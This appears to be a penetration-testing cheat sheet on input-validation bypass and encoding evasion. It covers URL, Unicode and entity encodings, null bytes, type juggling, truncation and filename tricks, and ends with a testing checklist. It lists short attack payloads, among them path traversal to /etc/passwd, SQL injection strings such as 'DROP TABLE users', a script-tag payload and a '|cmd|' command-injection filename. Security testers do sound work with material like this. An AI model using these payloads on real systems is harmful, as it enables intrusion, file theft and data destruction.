# Input Validation & Encoding Attacks

## Overview
Bypasses for client-side and server-side input validation, filter evasion, and encoding attacks across various vulnerability types.

## Validation Bypass Techniques

### Client-Side Bypass
```
# Intercept and modify request after client-side validation
# Use Burp Suite to bypass browser-side checks

# Remove maxlength attribute via browser console
document.getElementById('input').removeAttribute('maxlength')

# Disable JavaScript validation
# Change input type="number" to type="text"

# Edit HTML directly (browser devtools)
# Remove pattern, required, min/max attributes
```

### Filter Evasion via Encoding
```
# URL encoding
< → %3C, > → %3E, ' → %27, " → %22, / → %2F

# Double URL encoding
< → %253C, > → %253E

# Unicode / UTF-8 variations
< → \u003c, \xc0\xbc (overlong UTF-8)
' → \u0027, \u2019, \u02bc

# HTML entity encoding
< → &lt; &lt → &#x3c; → &#60;
" → &quot; → &#x22;

# HTML5 entities (no semicolon)
&lt → still works in HTML5
```

### Null Byte Injection
```
# Terminate string parsing
filename=../../etc/passwd%00.jpg
param=value%00<script>

# In SQL
' OR 1=1%00

# PHP null byte in file include (old PHP)
../../etc/passwd%00
```

### Unicode Normalization Attacks
```
# Unicode characters that normalize to ASCII equivalents
# After normalization, filter bypass achieved

ＳＥＬＥＣＴ → SELECT (fullwidth to ASCII)
＜script＞ → <script>

# Case folding:
ß → SS (German sharp S)
İ → I (Turkish dotted I)

# IRI to URI conversion can introduce injection
```

### Array/Object Input Pollution
```
# Parameter pollution
?param=value1&param=value2
# Result varies: first, last, or array

# PHP array notation
?param[]=value1&param[]=value2
?param[key]=value

# JSON type confusion
"age": "0; DROP TABLE users"  vs  "age": 0
"id": "1 OR 1=1"  vs  "id": 1
```

## Special Character Bypass
```
# Comments and whitespace
SQL: --comment, /*comment*/, /*!comment*/
HTML: <!-- comment -->
JS: // comment, /* comment */

# Alternative whitespace
%09 (tab), %0a (newline), %0d (CR), %20 (space), %0c (form feed), + (in URL)

# Separator alternatives
; vs %3b vs \x3b
```

## Integer Overflow / Type Juggling
```
# PHP type juggling
"0e1234" == 0  (scientific notation == integer)
"" == 0
"abc" == 0
null == false == 0 == ""

# Integer overflow
MAX_INT + 1 = negative (causes unexpected behavior)
-1 as user ID / amount

# Floating point
0.1 + 0.2 != 0.3 (floating point precision attacks)
price=0.001 (smallest possible price)
quantity=-1 (negative quantity)
```

## Length Limit Bypass
```
# Truncation attacks
# Input truncated at 50 chars in JS, but backend accepts 255
# Inject beyond client-side limit

# Database truncation
# Email: admin@target.com          (extra spaces) → stored as admin@target.com
# Username: "admin   " = "admin" after trim

# max-length bypass via API (no HTML constraints)
```

## Filename Attacks
```
# Path traversal in filenames
filename=../../etc/passwd
filename=..%2F..%2Fetc%2Fpasswd

# Null byte (old systems)
filename=evil.php%00.jpg

# Double extension
filename=evil.php.jpg
filename=evil.jpg.php

# Case sensitivity
filename=Evil.PHP (Windows: bypasses extension check)

# Special characters in filename
filename=../../evil.php (directory traversal)
filename=|cmd| (command injection)
```

## Testing Methodology
1. Identify all input fields and parameters
2. Test client-side validation bypass via Burp interception
3. Test encoding variants for each injection type
4. Test null bytes, special chars, Unicode normalization
5. Test type confusion (string vs int, array vs string)
6. Test length limits and truncation behavior
7. Test filename handling (if file upload present)
8. Fuzz with common special chars: `'`,`"`,`<`,`>`,`;`,`|`,`&`,`$`,`\`,`/`,`.`
